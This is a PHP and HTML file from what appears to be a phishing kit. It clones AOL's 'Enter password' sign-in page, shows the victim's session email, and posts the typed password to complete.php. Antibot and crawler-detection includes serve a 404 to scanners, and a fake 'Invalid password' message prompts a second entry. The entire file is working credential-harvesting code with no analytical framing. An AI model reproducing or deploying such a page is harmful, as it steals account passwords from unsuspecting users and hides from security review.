<?php
error_reporting(0);

session_start();
require_once '../../src/Classes/Comp.php';
    require_once '../../src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkValue()) {
        echo $antibot->throw404();
        die();
    } 
    include '../../crawlerdetect.php';
$useremail = $_SESSION['email'];

$ip = $_SERVER['REMOTE_ADDR'];
$hash = $_SESSION['value']; 

?>

<!DOCTYPE html>
<html id="Stencil" class="js grid light-theme ">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0">
      <meta name="format-detection" content="telephone=no">
      <meta name="referrer" content="origin-when-cross-origin">
      <title>AOL</title>
     <link rel="shortcut icon" type="image/png" href="aol/fav.png">
      <style nonce="">
         #mbr-css-check {
         display: inline;
         }
         .mbr-legacy-device-bar {
         display: none;
         }
      </style>
      <link href="aol/aol-main.css" rel="stylesheet" type="text/css">

   </head>
   <body class="">
      <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
         <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
         <input type="checkbox" id="mbr-legacy-device-bar-cross">
         <p class="mbr-legacy-device">
            AOL works best with the latest versions of browsers. You're using an out-of-date or unsupported browser and some AOL features may not work properly. Please update your browser version now. <a href="https://login.aol.com/account/challenge/password?done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Frequest_auth%3Fclient_id%3Ddj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--%26redirect_uri%3Dhttps%253A%252F%252Foidc.mail.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2520ycal-w%2520openid%2520openid2%2520mail-w%2520mail-x%2520sdps-r%2520msgr-w%26src%3Dmail%26language%3Den-GB%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vbWFpbC5hb2wuY29tL19jcXIvbG9naW5TdWNjZXNzPyZzaXRlU3RhdGU9dXYlM0FBT0wlM0JydCUzQVNURCUzQmF0JTNBU05TJTNCbGMlM0Flbl9HQiUzQmxkJTNBbWFpbC5hb2wuY28udWslM0JzbnQlM0FTY3JlZW5OYW1lJTNCc2lkJTNBODZiNmYzYzAtMDQ3Yy00NGRhLTkyMDItNzgwZDU0MDg5MTc2JTNCcXAlM0FpY2lkJTNEbmF2LXVraHAlM0ImbGFuZz1lbiZsb2NhbGU9R0IifQ.RyMWL5YIKSCqvbLpPKHs3Qo0Fi20f5GCKVV70B3yw_81RIq5l51rjpEDqtz233ayokmQU9cpag6-tTKZS7wSpAJfF_NCreJ0FMaL_yB3tpDNr0U35R1ICfAX8veKZYDrsrOXdLGcts_k0jxuf3-qnUZsmDQmCJ2Nh1Gq3BnWGD8%26nonce%3DVqCNooVPDjunkHmY9KHobrBhdSoU0Sxd&amp;src=mail&amp;redirect_uri=https%3A%2F%2Foidc.mail.aol.com%2Fcallback&amp;lang=en-GB&amp;client_id=dj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--&amp;language=en-GB&amp;authMechanism=primary&amp;display=login&amp;sessionIndex=Qg--&amp;acrumb=ZU9ZCHU7">More&nbsp;info</a>
         </p>
      </div>
     
      <div id="login-body" class="loginish  puree-v2 responsive">
         <div class="mbr-desktop-hd">
            <span class="column">
            <a href="https://www.aol.co.uk/">
            <img src="aol/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo " width="100" height="">
            <img src="aol/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo " width="100" height="">
            </a>
            </span>
            <span class="column help txt-align-right">
            <a href="https://help.aol.co.uk/">Help</a>
            </span>
         </div>
         <div class="login-box-container">
            <div class="login-box default">
               <div class="mbr-login-hd txt-align-center">
                  <img src="aol/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo aol-en-GB" width="100" height="">
                  <img src="aol/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo aol-en-GB" width="100" height="">
               </div>
               <div class="challenge password-challenge">
                  <div class="challenge-header">
                     <div class="yid"><?php echo $useremail; ?></div>
                  </div>
                  <div id="password-challenge" class="primary">
                     <strong class="challenge-heading">Enter&nbsp;password</strong>
                     <span class="txt-align-center challenge-desc">to finish signing&nbsp;in</span>
                     <form action="complete.php?value=<?php echo $_SESSION['value'];  ?>" method="post" class="pure-form challenge-form no-img-space">
    
                        <div class="hidden-username">
                           <input type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" name="username" value="red.son28" data-rapid_p="6">
                        </div>
                        <input type="hidden" name="passwordContext" value="normal" data-rapid_p="7">
                        <div id="password-container" class="input-group password-container blurred">
                           <input type="password" required id="login-passwd" class="password" name="password" placeholder=" " autofocus="" autocomplete="current-password" data-rapid_p="8">
                           <label for="login-passwd" id="password-label" class="password-label">Password</label>
                           <div class="caps-indicator hide" id="caps-indicator" title="Caps lock is on"></div>
                           <button type="button" class="show-hide-toggle-button hide-pw"  onclick='myFunction();' id="password-toggle-button" tabindex="-1" title="Show password" data-rapid_p="9"></button>
						   <script>
function myFunction() {
  var x = document.getElementById("login-passwd");
  if (x.type === "password") {
    x.type = "text";
  } else {
    x.type = "password";
  }
  if(document.getElementById("password-toggle-button").className == "show-hide-toggle-button hide-pw")
   document.getElementById("password-toggle-button").className = "show-hide-toggle-button show-pw";
else
   document.getElementById("password-toggle-button").className = "show-hide-toggle-button hide-pw";
}
</script>
                        </div>
						<p class="error-msg" role="alert" data-error="messages.ERROR_INVALID_PASSWORD">
            Invalid password. Please try&nbsp;again
        </p>
                        <div class="button-container">
                           <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="verifyPassword" value="Next" data-ylk="elm:btn;elmt:primary;mKey:primary_login_account-challenge-password_primaryBtn" data-rapid_p="10">
                           Next
                           </button>
                        </div>
                        <div class="forgot-cont bottom-cta">
                           <input type="submit" class="pure-button puree-button-link challenge-button-link" data-ylk="elm:btn;elmt:skip;slk:skip;mKey:primary_login_account-challenge-password_skipBtn" id="mbr-forgot-link" name="skip" value="Forgotten password?" data-rapid_p="11">
                        </div>
                     </form>
                  </div>
               </div>
            </div>
            <div id="login-box-ad-fallback" class="login-box-ad-fallback">
               <h1></h1>
               <p></p>
            </div>
         </div>

      </div>


   
      <div id="mbr-css-check"></div>
      <!-- fe15.member.ir2.yahoo.com - Mon Feb 03 2020 09:58:26 GMT+0000 (Coordinated Universal Time) - (1ms) -->
   </body>
</html>